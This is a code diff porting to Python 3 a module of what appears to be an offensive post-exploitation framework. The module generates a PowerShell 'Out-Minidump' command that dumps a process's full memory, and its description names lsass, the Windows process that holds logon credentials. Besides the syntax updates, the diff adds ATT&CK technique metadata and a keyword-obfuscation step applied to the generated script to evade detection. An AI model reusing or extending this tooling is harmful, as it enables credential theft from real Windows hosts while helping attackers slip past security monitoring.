@@ -1,6 +1,12 @@
+from __future__ import print_function
+
+from builtins import object
+from builtins import str
+
 from lib.common import helpers
 
-class Module:
+
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -10,6 +16,10 @@ class Module:
             'Author': ['@mattifestation'],
 
             'Description': ('Generates a full-memory dump of a process. Note: To dump another user\'s process, you must be running from an elevated prompt (e.g to dump lsass)'),
+
+            'Software': '',
+
+            'Techniques': ['T1033'],
 
             'Background' : True,
 
@@ -75,7 +85,7 @@ class Module:
         try:
             f = open(moduleSource, 'r')
         except:
-            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
+            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
             return ""
 
         moduleCode = f.read()
@@ -85,7 +95,7 @@ class Module:
         
         scriptEnd = ""
 
-        for option,values in self.options.iteritems():
+        for option,values in self.options.items():
             if option.lower() != "agent":
                 if values['Value'] and values['Value'] != '':
                     if option == "ProcessName":
@@ -93,11 +103,14 @@ class Module:
                     elif option == "ProcessId":
                         scriptEnd = "Get-Process -Id " + values['Value'] + " | Out-Minidump"
         
-        for option,values in self.options.iteritems():
+        for option,values in self.options.items():
             if values['Value'] and values['Value'] != '':
                 if option != "Agent" and option != "ProcessName" and option != "ProcessId":
                     scriptEnd += " -" + str(option) + " " + str(values['Value'])
+
         if obfuscate:
             scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
         script += scriptEnd
+        script = helpers.keyword_obfuscation(script)
+
         return script
